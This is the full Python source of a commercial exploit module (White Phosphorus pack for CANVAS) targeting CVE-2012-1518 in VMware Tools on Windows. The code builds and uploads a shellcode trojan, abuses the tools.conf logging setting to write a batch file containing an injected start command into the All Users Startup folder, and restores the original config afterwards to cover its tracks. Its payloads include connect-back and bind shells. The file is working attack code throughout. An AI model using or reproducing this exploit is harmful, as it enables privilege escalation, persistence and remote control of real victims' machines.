
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

import canvasengine
from canvasexploit import canvasexploit
from exploitutils import *
import shellcode.standalone.windows.payloads as payloads
from shellcode import shellcodeGenerator
from MOSDEF import pelib

######################################################################################
NAME = "VMware Tools Incorrect Folder Permissions Privilege Escalation"
DESCRIPTION = "Exploits a privilage escalation vulnerability in VMware"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='VMWare'
DOCUMENTATION["Date public"] = "2012-04-12"
DOCUMENTATION["References"] = "http://www.vmware.com/security/advisories/VMSA-2012-0007.html"
DOCUMENTATION['CVE Name']="CVE-2012-1518"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-1518'
DOCUMENTATION["Repeatability"] = "Unlimited"   
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["Notes"] = """
VMware Tools Incorrect Folder Permissions Privilege Escalation
Affects VMWare tools installed by

Workstation 8.0.1 and earlier
Workstation 7.1.5 and earlier
Player 4.0.1 and earlier
Player 3.1.5 and earlier
Fusion 4.1.1 and earlier
ESXi 5.0 without patch ESXi500-201203102-SG
ESXi 4.1 without patch ESXi410-201201402-BG
ESXi 4.0 without patch ESXi400-201203402-BG
ESXi 3.5 without patch ESXe350-201203402-T-BG
ESX 4.1 without patch ESX410-201201401-SG
ESX 4.0 without patch ESX400-201203401-SG
ESX 3.5 without patch ESX350-201203402-BG
      
This module works by setting the VMWare tools log file to write a .bat file to the All Users startup folder.

Sucessfully testing on Windows XP, Vista, Windows 7

Even if the hosting hypervisor has been patched, a Virtual Machine will still be vulnerable untill the new version of VMWare tools is installed.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]


NOTES="""
---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------------
Usage:


Example:
Usage:
Win32/MOSDEF$ runmodule wp_vmware_tools
"""

PORT = 0
######################################################################################


# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Universal", (0x00000000), [WINALL]]
}


from engine.config import canvas_root_directory

import random

class theexploit(wp_exploit):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]              
    
    # local exploits default to HTTPMosdef PLAIN 
    DEFAULT_PAYLOAD = 1
    
    def __init__(self):
        wp_exploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name          = NAME
        self.targets       = targets
        self.version       = 0
        self.use_universal = True
        self.vProtect      = True
        
        # We default these 
        self.HTTPMOSDEF    = False
        self.useSSLMOSDEF  = False        
        
        # This sets whether the local callback interface is used or not
        self.use_local_interface=False 
        
        self.node           = None
        self.local_path     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.trojan_name    = 'calc.exe'
        
    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        #self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()  
        
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()
        
        self.host=self.target.interface
            
        self.node = self.argsDict['passednodes'][0]
        return                

    def init_trojan(self):
        """
        Build + upload the trojan
        """
        trojan = ''
        try:
            
            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(self.shellcode)

            # write out the binary
            src = os.path.join(self.local_path, self.trojan_name)
            self.log('WP> Creating trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(trojan)
            fd.close()
            
            # upload the binary
            self.log('WP> Uploading trojan ...')
            dst = os.path.join(self.remote_path, self.trojan_name)
            ret = self.node.shell.upload(src, destfilename = dst)
            self.log('WP> %s' % ret)
            os.unlink(src)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def run(self):

        self.getArgs()

        if self.node.nodetype.lower() not in ['win32node', 'win64node']:
            self.log('WP> Node Type %s not supported ...'%self.node.nodetype)
            return False

        #ret, nodeos = self.node.shell.GetVersionEx()
        #minor, major = nodeos['Minor Version'], nodeos['Major Version']
        #if major < 6:
            #self.log('This exploit is only for Windows 2008/7/Vista')
            #return False

        # Check OS Version
        ret,nodeos=self.node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('WP> Attacking Windows %d.%d'%(major,minor))
        
        if major== 6:
            # Windows 7
            self.filepath = "C:\\ProgramData\\VMware\\VMware~1"
            self.remote_path = self.filepath
            self.script="C:/Users/ALLUSE~1/Microsoft/Windows/STARTM~1/Programs/Startup/wp.bat"
        else:
            # Windows XP and Other 
            self.filepath = "C:\\DOCUME~1\\ALLUSE~1\\APPLIC~1\\VMware\\VMware~1"            
            self.remote_path = self.filepath
            self.script="C:/DOCUME~1/ALLUSE~1/STARTM~1/Programs/Startup/wp.bat"

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('WP> Could not find vulnerable path %s' % self.remote_path)
            self.log('WP> It is probable this version of VMWare Tools is not vulnerable')
            return False                                    

        self.log('WP> Trojan path: %s' % self.remote_path)

        # build and upload callback trojan
        if self.init_trojan() == False:
            self.log('WP> Could not init trojan ...')
            return False

        self.log('WP> Using config path %s\\tools.conf' % self.filepath)
        self.log('WP> Writing wp.bat to %s' % self.script)

        
        # backup existing file
        self.log('WP> Backing up current config')
        cmd="copy \"" + self.filepath + "\\tools.conf\" \"" + self.filepath + "\\tools.conf.bak\""
        ret = self.node.shell.runcommand(cmd)
        
        # Setup exploit .conf file
        filedata="[logging]\r\n"
        filedata+="log = true\r\n"
        filedata+="vmsvc.level = warning\r\n"
        filedata+="vmsvc.handler = file\r\n"
        filedata+="vmsvc.data = "+self.script+"\r\n"
        
        self.log('WP> Creating new config')
        ret = self.node.shell.upload_data(filedata, self.filepath + "\\tools.conf")
        
        self.log('WP> Sleeping...')
        time.sleep(5)
        
        # create exploit .conf file
        filedata="[logging]\r\n"
        filedata+="log = true\r\n"
        filedata+="vmsvc.level = warning\r\n"
        filedata+="vmsvc.handler = file\r\n"
        filedata+="vmsvc.data = "+self.script+"\r\n"
        
        # Command we want to run
        filedata+="XXXX & start " + os.path.join(self.remote_path, self.trojan_name) + " & XXXXX\r\n"
        
        self.log('WP> Writing batch file')
        ret = self.node.shell.upload_data(filedata, self.filepath + "\\tools.conf")        
        self.log('WP> Sleeping...')
        time.sleep(5)

        # stop logging
        filedata="[logging]\r\n"
        filedata+="log = false\r\n"
        filedata+="vmsvc.level = warning\r\n"
        filedata+="vmsvc.handler = file\r\n"
        filedata+="vmsvc.data = \r\n"
        
        self.log('WP> Stopping logging')
        ret = self.node.shell.upload_data(filedata, self.filepath + "\\tools.conf")        
        self.log('WP> Sleeping...')
        time.sleep(5)

        
        # delete exploit config
        self.log('WP> Restoring original config')
        cmd="del \"" + self.filepath + "\\tools.conf\""
        ret = self.node.shell.runcommand(cmd)
                
        #restore old config
        cmd="copy \"" + self.filepath + "\\tools.conf.bak\" \"" + self.filepath + "\\tools.conf\""
        ret = self.node.shell.runcommand(cmd)
        
        
        self.log('WP> Exploit complete...')
        self.log('WP> wp.bat file created in startup folder')
        return True

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)     
